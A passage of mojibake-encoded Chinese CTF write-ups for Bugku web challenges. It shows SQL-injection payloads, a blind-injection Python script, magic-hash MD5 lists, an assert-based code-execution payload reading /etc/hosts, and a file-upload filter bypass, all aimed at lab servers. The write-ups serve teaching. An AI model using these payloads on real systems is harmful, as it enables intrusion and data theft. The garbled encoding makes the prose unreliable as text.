é€»è¾‘å°±æ˜¯ï¼Œä¼ å…¥ä¸€ä¸ªcookieï¼šISecerï¼Œå¦‚æœISecerååºåˆ—åŒ–çš„ç»“æœå’ŒKEYç›¸ç­‰ï¼Œå°±å¼¹å‡ºflagã€‚ä¹Ÿå°±æ˜¯cookieçš„å‚æ•°çš„å€¼å¿…é¡»ä¸º$kEYçš„å€¼çš„åºåˆ—åŒ–ã€‚æ³¨æ„$keyçš„å€¼åœ¨è°ƒç”¨çš„æ—¶å€™è¿˜æ²¡æœ‰è¢«å®šä¹‰æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸² &lt;?php echo serialize(&apos;&apos;); ?&gt; è¾“å‡ºs:0:â€™â€™ ç„¶åæˆ‘ä»¬æŠ“åŒ…å°†Cookieçš„å€¼æ”¹ä¸ºISecer=s:0:â€™â€™ï¼Œå³å¯å¾—å‡ºflag äº”ã€ç¬¬43é¢˜ï¼ˆsql2ï¼‰è¯¥é¢˜ä¸ºpostå‹çš„sqlæ³¨å…¥ï¼Œå°è¯•äº†å„ç§sqlæ³¨å…¥å‘ç°éƒ½è¢«è¿‡æ»¤äº†ï¼Œå½“æ—¶é‚£ä¸ªç»æœ›å‘€ã€‚å»çœ‹åˆ«äººåšå®¢æç¤ºè¯´æ˜¯DS_Storeæºç æ³„éœ²ï¼Œç„¶åå°±éœ€è¦ç”¨åˆ°pythonè„šæœ¬æ¥è·‘ä¸€ä¸‹äº†ï¼Œå‘ç°äº†flagç›®å½•ï¼Œç›´æ¥è®¿é—®ï¼Œç„¶åå°±å¾—åˆ°äº†flagã€‚DS_Storeä¸‹è½½åœ°å€ï¼šhttps://github.com/lijiejie/ds_store_exp æˆ‘ä»¬äº†è§£ä¸‹ä»€ä¹ˆæ˜¯DS_Storeæºç æ³„éœ² å…­ã€ç¬¬45é¢˜ï¼ˆTrimçš„æ—¥è®°æœ¬ï¼‰ç™»å…¥ï¼Œé¢å‘ç°é¢˜ç›®çš„å‡ºäº†ç‚¹é—®é¢˜ï¼Œä¸å¤Ÿä¸å½±å“æˆ‘ä»¬è§£é¢˜ï¼Œæ‰«æç™»å½•http://123.206.87.240:9002/show.phpæäº¤flagç«Ÿç„¶æ˜¯çœŸçš„ã€‚ ä¸ƒã€ç¬¬46é¢˜ï¼ˆlogin2ï¼‰ç¬¬ä¸€æ­¥æŠ“åŒ…å¯ä»¥å‘ç°è¿™è¾¹æœ‰ä¸€å †base64åŠ å¯†çš„ç¼–ç è§£å¯† $sql=&quot;SELECT username,password FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot;; if (!empty($row) &amp;&amp; $row[&apos;password&apos;]===md5($password)){ è¿™æ®µä»£ç çš„æ„æ€å¤§æ¦‚å°±æ˜¯ï¼Œé€šè¿‡è¾“å…¥ä¸å­˜åœ¨ç”¨æˆ·ï¼Œç”¨union select æ„é€ å‡ºæŒ‡å®šå¯†ç çš„md5å€¼ï¼Œå³å¯ç™»å…¥æˆåŠŸusername=1â€™ union select 1,md5(1)#&amp;password=1 å…«ã€ç¬¬47é¢˜ï¼ˆlogin3ï¼‰æˆ‘ä»¬å…ˆå°è¯•ä¸‹è´¦å·adminå¯†ç pass,å‘ç°è¿”å›å¯†ç é”™è¯¯ã€‚è´¦å·adminâ€™,å¯†ç passå‘ç°è¯´æ˜æœ¬é¢˜åº”è¯¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨å†æ„é€ è¯­å¥ï¼Œè¿›è¡Œå‡ æ¬¡çš„åŸºäºboolç›²æ³¨çš„æ³¨å…¥ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰ç»•è¿‡ä¸€äº›ç‰¹æ®Šçš„è¯­å¥ username=â€™^(1)^1#&amp;password=123åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå‘ç°è¿‡æ»¤äº† â€˜ç©ºæ ¼â€™ ä»¥åŠ â€™=â€˜ ï¼Œåˆ™ç©ºæ ¼å¯ä»¥ä½¿ç”¨ () ä»£æ›¿ï¼Œ=å¯ä»¥ä½¿ç”¨ &lt;&gt; ä»£æ›¿,è¿˜æœ‰and informationã€‚é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æƒ³åˆ°ä½¿ç”¨è„šæœ¬ï¼Œæ¯•ç«Ÿæ‰‹åŠ¨ç›²æ³¨ä»€ä¹ˆæ—¶å€™æ˜¯ä¸ªå¤´ï¼Œç„¶åå°†å¾—åˆ°çš„å¯†ç MD5è§£å¯†é™„ä¸Šè„šæœ¬ä»£ç  import requests guess = &quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/=&quot; url = &quot;http://123.206.31.85:49167/&quot; database=&quot;&quot; for i in range(0,35): for j in guess: # uname = &quot;admin&apos;^(ascii(mid(database()from(%i)))&lt;&gt;%s)^0#&quot;%(i,ord(j)) uname = &quot;admin&apos;^(ascii(mid((select(password)from(admin))from(%i)))&lt;&gt;%s)^0#&quot;%(i,ord(j)) data = { &quot;username&quot;:uname, &quot;password&quot;:&quot;123&quot; } res = requests.post(url=url,data=data).text if &quot;password error&quot; in res: database += j print(database) break å¤§å®¶ä¹Ÿå¯ä»¥å‚è€ƒä¸‹è¿™ç¯‡æ–‡ç« https://blog.csdn.net/qq_42133828/article/details/86815663 ä¹ã€ç¬¬48é¢˜ï¼ˆlogin4ï¼‰ç»è¿‡å°è¯•å‘ç°é¢˜ç›®è¯´åªæœ‰adminå¯ä»¥çœ‹åˆ°flagåˆè¯´adminä¸å…è®¸ç™»å½•å‚è€ƒè¿™ç¯‡æ–‡ç« https://blog.csdn.net/csu_vc/article/details/79619309 åã€æ–‡ä»¶ä¸Šä¼ 2ï¼ˆæ¹˜æ¡¥æ¯ï¼‰ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿›ä¸äº†é¢˜ç›®å¤§å®¶å¯ä»¥å‚è€ƒä¸‹è¿™ç¯‡æ–‡ç« https://www.jianshu.com/p/59730b290120 åä¸€ã€ç§‹åå±±è€å¸æœºç›´æ¥ç”¨pythonè„šæœ¬å³å¯å¾—å‡ºflag #coding:utf-8 import requests import re url = &quot;http://123.206.87.240:8002/qiumingshan/&quot; res = requests.session() s = res.get(url).text num = re.search(r&apos;(\d+[+\-*])+(\d+)&apos;,s).group() result = eval(num) data = {&apos;value&apos;:result} print(res.post(url=url,data=data).text)]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku-29-36 writeup(web)]]></title>
    <url>%2F2019%2F04%2F08%2Fbugku-29-36%2F</url>
    <content type="text"><![CDATA[ä¸€ã€ç¬¬29é¢˜login1(SKCTF)æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç®¡ç†ç™»å…¥ç•Œé¢ã€‚ä¸”é¢˜ç›®æç¤ºæˆ‘ä»¬è¿™æ˜¯åˆ°sqlçº¦æŸæ”»å‡»çš„é¢˜ç›®ã€‚é‚£ä¹ˆæˆ‘ä»¬å…ˆç®€å•ä»‹ç»ä¸‹ä»€ä¹ˆæ˜¯sqlçº¦æŸæ”»å‡» (1)ã€çº¦æŸSQLæ³¨å…¥çš„åŸç†å°±æ˜¯åˆ©ç”¨çš„çº¦æŸæ¡ä»¶ï¼Œæ¯”å¦‚æœ€é•¿åªèƒ½æœ‰10ä¸ªå­—ç¬¦çš„è¯ï¼Œå¦‚æœä½ è¾“å…¥çš„æ˜¯aaaaaaaaaabb(12ä½ï¼‰ï¼Œé‚£ä¹ˆä¿å­˜åœ¨æ•°æ®åº“é‡Œçš„å°±æ˜¯aaaaaaaaaa(10ä½)ï¼Œé‚£ä¹ˆåˆ«äººç”¨aaaaaaaaaabbæ³¨å†Œä¸€ä¸ªç”¨æˆ·åï¼Œå°±å¯ä»¥ç™»é™†ã€‚ ï¼ˆ2ï¼‰ã€è¿˜æœ‰ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„åœ°æ–¹å°±æ˜¯SQLåœ¨æ‰§è¡Œå­—ç¬¦ä¸²å¤„ç†çš„æ—¶å€™æ˜¯ä¼šè‡ªåŠ¨ä¿®å‰ªæ‰å°¾éƒ¨çš„ç©ºç™½ç¬¦çš„ï¼Œä¹Ÿå°±æ˜¯è¯´â€abcâ€==â€abc â€œï¼ŒåŒæ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨å†Œç”¨æˆ·åä¸ºâ€abc â€œçš„è´¦å·æ¥ç™»é™†â€abcâ€çš„è´¦å·ã€‚ æˆ‘ä»¬å…ˆæ³¨å†Œä¸‹,è´¦å·ä¸ºadmin,å¯†ç éšæ„ï¼Œå‘ç°ç”¨æˆ·å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨è´¦å·ä¸ºadmin+ä¸€ä¸ªç©ºæ ¼,å¯†ç ä»»æ„ï¼Œæ³¨å†Œï¼Œç„¶åç™»å…¥å‘ç°ï¼ŒæˆåŠŸå¾—åˆ°flag. äºŒã€ç¬¬30é¢˜ï¼ˆä½ ä»å“ªé‡Œæ¥ï¼‰æ‰“å¼€é¢˜ç›®å‘ç°ï¼Œé¢˜ç›®æœ‰ä¸€è¡Œå­—ï¼Œä½ æ¥ç€Googleå—ã€‚é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æƒ³åˆ°httpå¤´éƒ¨çš„refererå‚æ•° refererå‚æ•°çš„ä½œç”¨ç®€å•è¯´å°±æ˜¯å‘Šè¯‰æœåŠ¡å™¨æˆ‘æ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ æˆ‘ä»¬æŠ“åŒ…æ·»åŠ refererå‚æ•°å³å¯å¾—åˆ°flagã€‚ ä¸‰ã€ç¬¬31é¢˜ï¼ˆmd5 collisionï¼‰æ‰“å¼€é¢˜ç›®ï¼Œé¢˜ç›®è¦æ±‚æˆ‘ä»¬ä¼ è¾“å‚æ•°a,æˆ‘ä»¬ä¼ å…¥å‚æ•°açš„å€¼ä¸º1ï¼Œå‘ç°è¾“é”™false.é‚£ä¹ˆæˆ‘ä»¬è€ƒè™‘é¢˜ç›®æ‰€æåˆ°çš„MD5ç¢°æ’ï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆä»‹ç»ä¸‹ä»€ä¹ˆæ˜¯MD5ç¢°æ’ PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚ æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€æ¼æ´ï¼Œé€šè¿‡è¾“å…¥ä¸€ä¸ªç»è¿‡å“ˆå¸Œåä»¥â€0Eâ€å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œå³ä¼šè¢«PHPè§£é‡Šä¸º0ï¼Œå¦‚æœæ•°æ®åº“ä¸­å­˜åœ¨è¿™ç§å“ˆå¸Œå€¼ä»¥â€0Eâ€å¼€å¤´çš„å¯†ç çš„è¯ï¼Œä»–å°±å¯ä»¥ä»¥è¿™ä¸ªç”¨æˆ·çš„èº«ä»½ç™»å½•è¿›å»ï¼Œå°½ç®¡å¹¶æ²¡æœ‰çœŸæ­£çš„å¯†ç ã€‚ ä¸‹é¢æ˜¯å¸¸è§çš„0eå¼€å¤´çš„md5å’ŒåŸå€¼ï¼š0eå¼€å¤´çš„md5å’ŒåŸå€¼ï¼š s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a æ›´å¤šçš„å¤§å®¶å¯ä»¥è‡ªå·±å»ç™¾åº¦ ä¸Šé¢çš„é‚£äº›0Eå¼€å¤´çš„å­—ç¬¦ä¸²éƒ½å¯ä»¥ä½œä¸ºå‚æ•°çš„å€¼ä¼ å…¥ï¼Œå¦‚ http://123.206.87.240:9009/md5.php?a=s878926199a å››ã€ç¬¬32é¢˜ï¼ˆç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™ï¼‰æ‰“å¼€é¢˜ç›®å‘ç°ï¼Œé¢˜ç›®é‡Œå†™ç€è¯·ä»æœ¬åœ°è®¿é—®ã€‚é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æƒ³åˆ°httpå¤´éƒ¨çš„X-Forwarded-Forå‚æ•° æˆ‘ä»¬å…ˆä»‹ç»ä¸‹X-Forwarded-Forå‚æ•°X-Forwarded-For: ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹ã€‚ æˆ‘ä»¬æŠ“åŒ…è¿›è¡Œæ·»åŠ X-Forwarded-Forå‚æ•°ï¼Œå³å¯å¾—å‡ºflag äº”ã€ç¬¬33é¢˜ï¼ˆå„ç§ç»•è¿‡å“Ÿï¼‰è¿›å…¥è¿™é“é¢˜æˆ‘ä»¬é€šè¿‡é˜…è¯»phpä»£ç ï¼Œæˆ‘ä»¬å‘ç°åªè¦ä½¿unameçš„sha1å’Œå€¼ä¸passwdçš„sha1çš„å€¼ç›¸ç­‰å³å¯ï¼Œä½†æ˜¯åŒæ—¶ä»–ä»¬ä¸¤ä¸ªçš„å€¼åˆä¸èƒ½ç›¸ç­‰ï¼Œæˆ‘ä»¬å°è¯•æ„é€ æ•°ç»„ã€‚æˆåŠŸå¾—å‡ºflag å…­ã€ç¬¬34é¢˜ï¼ˆweb8ï¼‰æ ¹æ®é¢˜ç›®æç¤ºçš„txt.å¹¶ä¸”åˆ†ææºç æˆ‘ä»¬å¯ä»¥å¾—å‡ºä»¥ä¸‹å‡ ç‚¹æœ‰ç”¨ä¿¡æ¯1ã€fçš„å€¼ä»fnæ–‡ä»¶ä¸­å–å‡º2ã€acçš„å€¼å’Œç±»å‹ä¸fçš„å€¼å’Œç±»å‹å®Œå…¨ç›¸ç­‰æ—¶ï¼Œå³å¯å¾—å‡ºflag å¯»æ‰¾flag, http://123.206.87.240:8002/web8/flag.txt å¯ä»¥çœ‹å‡ºflag.txtçš„æ–‡ä»¶çš„å†…å®¹ä¸ºflagsé‚£ä¹ˆæˆ‘ä»¬è®©fnæŒ‡å‘flag.txtæ–‡ä»¶ï¼Œacä¸ºè¯¥æ–‡ä»¶çš„å†…å®¹ï¼›æ„é€ payload http://123.206.87.240:8002/web8/?ac=flags&amp;fn=flag.txt ä¸ƒã€ç¬¬35é¢˜ï¼ˆç»†å¿ƒï¼‰é¦–å…ˆæ‰“å¼€é¢˜ç›®å‘ç°æ˜¯ä¸€ä¸ª404 not found æŸ¥çœ‹æºç å¹¶æ²¡æœ‰ä»€ä¹ˆå‘ç°ã€‚æƒ³åˆ°é¢˜ç›®çš„æç¤º æƒ³åŠæ³•å˜æˆadminï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨å¾¡å‰‘å·¥å…·æ‰«æä¸‹åå°ï¼Œå‘ç°robots.txtæ–‡ä»¶robots.txtæ–‡ä»¶ç®€å•è¯´å°±æ˜¯ç½‘ç»œçˆ¬è™«è§„åˆ™è®¿é—®robots.txtæ–‡ä»¶ï¼Œå‘ç°resusl.phpæ–‡ä»¶è®¿é—®resusl.phpæ–‡ä»¶å‘ç°ï¼Œé¢˜ç›®æç¤ºæˆ‘ä»¬ä¸æ˜¯ç®¡ç†å‘˜ï¼Œéœ€è¦ä¼ å…¥å‚æ•°xé‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥å‚æ•°x=admin å…«ã€ç¬¬36é¢˜ï¼ˆæ±‚getshellï¼‰ æŠŠè¯·æ±‚å¤´é‡Œé¢çš„Content-Typeå­—æ¯æ”¹æˆå¤§å†™è¿›è¡Œç»•è¿‡ .jpgåé¢åŠ ä¸Š.php5å…¶ä»–çš„éƒ½è¢«è¿‡æ»¤äº†å¥½åƒ content-Typeçš„å€¼æ”¹ä¸ºimage/jpgï¼ˆé¢˜ç›®è¦æ±‚æˆ‘ä»¬ä¼ å…¥imageï¼‰ å¦‚æœæ˜¯walfä¸¥æ ¼åŒ¹é…ï¼Œé€šè¿‡ä¿®æ”¹Content-typeåå­—æ¯çš„å¤§å°å†™å¯ä»¥ç»•è¿‡æ£€æµ‹ï¼Œä½¿å¾—éœ€è¦ä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥åˆ°è¾¾æœåŠ¡å™¨ç«¯ï¼Œè€ŒæœåŠ¡å™¨çš„å®¹é”™ç‡è¾ƒé«˜ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥è§£æã€‚ç„¶åå°±éœ€è¦ç¡®å®šæˆ‘ä»¬å¦‚ä½•ä¸Šä¼ æ–‡ä»¶ï¼Œåœ¨åˆ†åˆ«å°†åç¼€åä¿®æ”¹ä¸ºphp2, php3, php4, php5, phps, pht, phtm, phtmlï¼ˆphpçš„åˆ«åï¼‰ï¼Œå‘ç°åªæœ‰php5æ²¡æœ‰è¢«è¿‡æ»¤ï¼ŒæˆåŠŸä¸Šä¼ ï¼Œå¾—åˆ°flag]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 26-27 writeup(web)]]></title>
    <url>%2F2019%2F03%2F19%2Fbugku-26-27%2F</url>
    <content type="text"><![CDATA[ä¸€ã€ç¬¬26é¢˜ï¼ˆè¿‡ç‹—ä¸€å¥è¯ï¼‰æ‰“å¼€é“¾æ¥å‘ç°ä¸€ç¯‡ç©ºç™½ï¼ŒæŠ“åŒ…ä¹Ÿæ²¡ä»€ä¹ˆå‘ç°ã€‚é‚£ä¹ˆæˆ‘ä»¬åªèƒ½åˆ†æä¸Šé¢é‚£æ®µä»£ç äº†explode()å‡½æ•°å°±æ˜¯æŠŠ$pocå˜é‡ç”¨#å·æ¥åˆ†å‰²å¼€æ¥ã€‚é‚£ä¹ˆ$poc_2å°±æ˜¯assert,ä»–å’Œæœ€åä¸€å¥ä»£ç æ„é€ æˆäº†assert()å‡½æ•°,assertå‡½æ•°åŠŸèƒ½è·Ÿevalç±»ä¼¼ï¼Œå¯ä»¥æŠŠé‡Œé¢çš„å†…å®¹å½“ä½œä»£ç æ¥æ‰§è¡Œã€‚ é‚£ä¹ˆæˆ‘ä»¬æ„é€ payloadä¸º?s=print_r(scandir(&#39;./&#39;))ï¼Œæ‰«æå‡ºææœ¬çº§ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ï¼ˆè¿™å…¶å®æ˜¯ä¸€ç§xssæ”»å‡»ï¼‰å‘ç°äº†flag_sm1skla1.txtæ–‡ä»¶ã€‚è®¿é—®è¯¥æ–‡ä»¶å³å¯å¾—å‡ºflagæ‹“å±•ï¼šæˆ‘ä»¬æ‰«æä¸Šçº§ç›®å½• http://123.206.87.240:8010/?s=print_r(scandir(%27../%27)) æ ¹æ®ç›®å½•ç»“æ„åº”è¯¥æ˜¯linuxç³»ç»Ÿï¼Œhostsæ–‡ä»¶åº”è¯¥åœ¨etcé‡Œé¢ http://123.206.87.240:8010/?s=print_r(readfile(%27../etc/hosts%27)) ä¸€ã€ç¬¬27é¢˜ï¼ˆå­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿï¼‰æ‰“å¼€é¢˜ç›®ï¼Œæ˜¯ä¸€æ®µä»£ç  &lt;?php highlight_file(&apos;2.php&apos;); $key=&apos;KEY{********************************}&apos;; $IM= preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match); if( $IM ){ die(&apos;key is: &apos;.$key); } ?&gt; åˆ†æè¿™æ®µä»£ç å¯ä»¥å‘ç°ï¼Œåªè¦æˆ‘ä»¬æ„é€ å‡ºä¸€ä¸ªç¬¦å·æ¡ä»¶çš„KEYä½œä¸ºå‚æ•°ä¼ å…¥å³å¯å¾—åˆ°flag,çªç„¶å‘ç°æˆ‘çš„æ­£åˆ™å­¦äº†å’Œæ²¡å­¦ä¸€æ ·ã€‚ è¿™è¾¹å…ˆä»‹ç»ä¸‹ preg_match â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é… preg_match ( $pattern , $subject , $matches ) æœç´¢subjectä¸patternç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼çš„ä¸€ä¸ªåŒ¹é…. å‚æ•° ï¼š pattern : è¦æœç´¢çš„æ¨¡å¼ï¼Œå­—ç¬¦ä¸²ç±»å‹(æ­£åˆ™è¡¨è¾¾å¼)ã€‚subject : è¾“å…¥çš„å­—ç¬¦ä¸²ã€‚matches :ï¼ˆå¯æœ‰å¯æ— ï¼‰å¦‚æœæä¾›äº†å‚æ•°matchesï¼Œå®ƒå°†è¢«å¡«å……ä¸ºæœç´¢ç»“æœã€‚ $matches[0]å°†åŒ…å«å®Œæ•´æ¨¡å¼åŒ¹é…åˆ°çš„æ–‡æœ¬ï¼Œ $matches[1] å°†åŒ…å«ç¬¬ä¸€ä¸ªæ•è·å­ç»„åŒ¹é…åˆ°çš„æ–‡æœ¬ï¼Œä»¥æ­¤ç±»æ¨ã€‚ è¿”å›å€¼ ï¼š preg_match()è¿”å› pattern çš„åŒ¹é…æ¬¡æ•°ã€‚ å®ƒçš„å€¼å°†æ˜¯0æ¬¡ï¼ˆä¸åŒ¹é…ï¼‰æˆ–1æ¬¡ï¼Œå› ä¸ºpreg_match()åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…å å°†ä¼šåœæ­¢æœç´¢ã€‚preg_match_all()ä¸åŒäºæ­¤ï¼Œå®ƒä¼šä¸€ç›´æœç´¢subject ç›´åˆ°åˆ°è¾¾ç»“å°¾ã€‚ å¦‚æœå‘ç”Ÿé”™è¯¯preg_match()è¿”å› FALSEã€‚ å®ä¾‹1ï¼š $label = &apos;content/112&apos;; $a = preg_match(&apos;#content/(\d+)#i&apos;, $label, $mc); var_dump($a); var_dump($mc); è¾“å‡ºï¼š int(1) array(2) { [0]=&gt; string(11) &quot;content/112&quot; [1]=&gt; string(3) &quot;112&quot; } å¼€å§‹åˆ†æä¸‹é¢˜ç›®ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼å®šç•Œç¬¦ï¼š/å’Œ/ï¼ˆä¸€èˆ¬æ¥è¯´æ˜¯è¿™ä¸¤ä¸ªï¼Œå…¶å®é™¤äº†\å’Œå­—æ¯æ•°å­—å…¶å®ƒçš„åªè¦æ˜¯æˆå¯¹å‡ºç°éƒ½å¯ä»¥çœ‹åšå®šç•Œç¬¦ï¼Œæ¯”å¦‚##ã€ï¼ï¼ä¹‹ç±»çš„ï¼‰ï¼› . ï¼ˆä¸€ä¸ªç‚¹ï¼‰ï¼šè¡¨ç¤ºå¯ä»¥åŒ¹é…ä»»ä½•å­—ç¬¦ï¼› * ï¼šå‰é¢çš„å­—ç¬¦é‡å¤é›¶æ¬¡æˆ–å¤šæ¬¡ï¼› {n,m} ï¼šæœ€å°‘åŒ¹é… 4 æ¬¡ä¸”æœ€å¤šåŒ¹é… 7 æ¬¡ï¼Œç»“åˆå‰é¢çš„ . ä¹Ÿå°±æ˜¯åŒ¹é… 4 åˆ° 7 ä¸ªä»»æ„å­—ç¬¦; \ ï¼ˆåæ–œçº¿ï¼‰ï¼šåé¢çš„å­—ç¬¦è¢«è½¬ä¹‰ï¼› [a-z] ï¼šåœ¨aåˆ°zä¸­åŒ¹é… ï¼› [[:punct:]] ï¼šåŒ¹é…ä»»ä½•æ ‡ç‚¹ç¬¦å·ï¼› /i ï¼šè¡¨ç¤ºè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼› æˆ‘ä»¬æ„é€ id=keykeyaaaakey:/a/keyz;]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 22-24 write upï¼ˆwebï¼‰]]></title>
    <url>%2F2019%2F03%2F19%2Fbugku-22-24%2F</url>
    <content type="text"><![CDATA[ä¸€ã€ç¬¬22é¢˜ï¼ˆé€Ÿåº¦è¦å¿«)é¦–å…ˆæˆ‘ä»¬æŸ¥çœ‹æºç  &lt;/br&gt;æˆ‘æ„Ÿè§‰ä½ å¾—å¿«ç‚¹!!!&lt;!-- OK ,now you have to post the margin what you find --&gt; å‘ç°æœ‰postéœ€è¦æäº¤ï¼Œå‚æ•°ä¸ºmarign é‚£ä¹ˆæˆ‘ä»¬å¼€å§‹æŠ“åŒ…ï¼Œç„¶åå‘ç°æ˜¯base64ç¼–ç çš„flag,è§£ç åï¼Œè¾“å…¥flag,å‘ç°flagé”™è¯¯ã€‚é¢ï¼Œæˆ‘ä»¬å†æ¬¡æŠ“åŒ…ï¼Œå‘ç°flagåˆå˜åŒ–äº†ã€‚æ€ªå¾—é¢˜ç›®è¯´æˆ‘è§‰å¾—ä½ å¾—å¿«ç‚¹ã€‚æˆ‘æœ‰å°è¯•äº†å‡ æ¬¡å‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œçœ‹æ¥åªèƒ½å€ŸåŠ©pythonè„šæœ¬äº† import requests import base64 url = &apos;http://123.206.87.240:8002/web6/&apos; s = requests.session() flag = s.get(url).headers[&apos;flag&apos;] # flagåœ¨å“åº”å¤´é‡Œ #ä¸ºäº†ä¸‹é¢ä½¿ç”¨splitä¸æŠ¥é”™ï¼Œba64decodeæ“ä½œçš„å¯¹è±¡æ˜¯byteç±»å‹çš„å­—ç¬¦ä¸²ï¼Œè€Œsplitå‡½æ•°è¦ç”¨strç±»å‹ flag = base64.b64decode(flag).decode() flag = base64.b64decode(flag.split(&quot;:&quot;)[1]).decode() # è·å–flagåçš„å€¼ payload = {&apos;margin&apos;: flag} print(s.post(url, data = payload).text) # postæ–¹æ³•ä¸Šä¼  pythonä¸­stræ˜¯ç»è¿‡ç¼–å¥½ç çš„å­—ç¬¦ä¸²ï¼Œå¦‚unicode,gb2312,asciiç¼–ç ï¼Œå¯ä»¥è¡¨ç¤ºä¸åŒè¯­è¨€ä¸­çš„å­—ç¬¦ï¼Œå¯ä»¥è§£ç æˆbytebyteæ˜¯å­—èŠ‚ï¼Œåªèƒ½æ˜¯asciiç 0-255çš„å­—ç¬¦ï¼Œè¡¨ç¤ºæœªç»ç¼–ç å¤„ç†çš„åŸå§‹å­—ç¬¦ä¸² splitå‡½æ•°ç®€å•çš„ä»‹ç» strä¸byteçš„ç®€å•çš„è½¬åŒ–æ–¹æ³•ï¼š flag=flag.decode()//byteè½¬ä¸ºstr flag=flag.encode()//strè½¬ä¸ºbyte äºŒã€ç¬¬23é¢˜ï¼ˆcookieæ¬ºéª—ï¼‰http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=æ‰“å¼€é¢˜ç›®å‘ç°ï¼Œfilenameå‚æ•°åé¢æ˜¯ä¸€ä¸²base64ç¼–ç ï¼Œè¿›è¡Œè§£ç å¾—keys.txt.æˆ‘ä»¬æŠŠindex.phpè¿›è¡Œbase64ç¼–ç åæ”¾åœ¨filenameå‚æ•°çš„åé¢ï¼Œè¿›è¡Œè¾“å…¥ http://123.206.87.240:8002/web11/index.php?line=1&amp;filename=aW5kZXgucGhw æ”¹å˜lineåé¢çš„æ•°å­—å³å¯ä¸€è¡Œä¸€è¡Œçš„è¾“å‡ºindex.phpçš„å†…å®¹è¿™æ ·å­å¤ªæ…¢äº†ï¼Œæˆ‘ä»¬å†™ä¸ªpythonè„šæœ¬æ¥å®ç°ã€‚ import requests def 